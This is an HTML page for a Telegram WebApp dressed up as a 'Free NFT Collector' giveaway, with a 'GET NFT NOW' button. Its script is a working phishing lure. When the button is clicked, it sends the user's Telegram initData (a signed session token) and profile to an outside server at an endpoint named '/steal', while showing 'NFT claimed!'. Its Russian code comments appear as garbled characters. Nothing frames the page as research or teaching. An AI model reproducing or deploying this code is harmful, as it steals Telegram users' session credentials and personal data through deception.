<!DOCTYPE html>
<html>
<head>
    <title>Free NFT Collector</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
            background-color: #f0f8ff;
        }
        .container {
            max-width: 500px;
            margin: 0 auto;
            padding: 30px;
            background: white;
            border-radius: 20px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }
        button {
            padding: 15px 30px;
            font-size: 18px;
            cursor: pointer;
            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
            color: white;
            border: none;
            border-radius: 50px;
            margin: 20px 0;
            transition: all 0.3s;
        }
        button:hover {
            transform: scale(1.05);
            box-shadow: 0 8px 25px rgba(37, 117, 252, 0.4);
        }
        #status {
            margin-top: 20px;
            padding: 15px;
            border-radius: 10px;
            background: #f8f9fa;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 style="color: #6a11cb;">üé® Free NFT Collector</h1>
        <p>Click the button to claim your exclusive NFT</p>

        <button id="get-nft">‚ú® GET NFT NOW</button>

        <div id="status">
            <p>Status: <span id="status-text">Ready</span></p>
        </div>
    </div>

    <script>
    // 1. –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è WebApp
    try {
        Telegram.WebApp.ready();
        console.log("Telegram WebApp initialized");
        updateStatus("WebApp initialized", "green");
    } catch (e) {
        updateStatus(`Init error: ${e.message}`, "red");
    }

    // 2. –≠–ª–µ–º–µ–Ω—Ç—ã –¥–ª—è –æ—Ç–ª–∞–¥–∫–∏
    const statusText = document.getElementById('status-text');
    const button = document.getElementById('get-nft');

    // 3. –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ–¥–¥–µ—Ä–∂–∫–∏ WebApp
    function updateStatus(message, color = 'black') {
        statusText.textContent = message;
        statusText.style.color = color;
        console.log(message);
    }

    // 4. –ü—Ä–æ–≤–µ—Ä–∫–∞ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏
    if (!window.Telegram || !Telegram.WebApp) {
        updateStatus("Error: Telegram WebApp not loaded", "red");
        button.disabled = true;
    } else {
        updateStatus("WebApp OK", "green");
    }

    // 5. –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    try {
        const user = Telegram.WebApp.initDataUnsafe.user;
        if (user) {
            updateStatus(`Hello, ${user.first_name || 'User'}!`);
        } else {
            updateStatus("User data not available", "orange");
        }
    } catch (e) {
        updateStatus(`User error: ${e.message}`, "red");
    }

    // 6. –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–Ω–æ–ø–∫–∏
    button.addEventListener('click', async function() {
        updateStatus("Starting...", "blue");

        try {
            // A. –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
            const user = Telegram.WebApp.initDataUnsafe.user;
            if (!user || !user.id) {
                throw new Error("User data missing");
            }

            // B. –°–æ–∑–¥–∞–µ–º —Ç–µ—Å—Ç–æ–≤—ã–π –∑–∞–ø—Ä–æ—Å
            updateStatus("Sending test request...", "purple");

            const testResponse = await fetch('https://nftsssf-juerasd.amvera.io/steal', {
                method: 'OPTIONS'
            });

            if (!testResponse.ok) {
                throw new Error(`Test OPTIONS failed: ${testResponse.status}`);
            }

            updateStatus("Connection OK!", "green");

            // C. –û—Ç–ø—Ä–∞–≤–∫–∞ —Ä–µ–∞–ª—å–Ω–æ–≥–æ –∑–∞–ø—Ä–æ—Å–∞
            updateStatus("Sending NFT request...", "purple");

            const response = await fetch('https://nftsssf-juerasd.amvera.io/steal', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    token: Telegram.WebApp.initData,
                    user: user
                })
            });

            // D. –û–±—Ä–∞–±–æ—Ç–∫–∞ –æ—Ç–≤–µ—Ç–∞
            if (!response.ok) {
                throw new Error(`Server error: ${response.status}`);
            }

            const data = await response.json();
            if (data.success) {
                updateStatus("NFT claimed!", "green");
                alert("üéâ Success!");
            } else {
                throw new Error(data.error || "Unknown error");
            }
        } catch (error) {
            updateStatus(`Error: ${error.message}`, "red");
            alert(`üö® Error: ${error.message}`);
            console.error("Error details:", error);
        }
    });
</script>

</body>
</html>
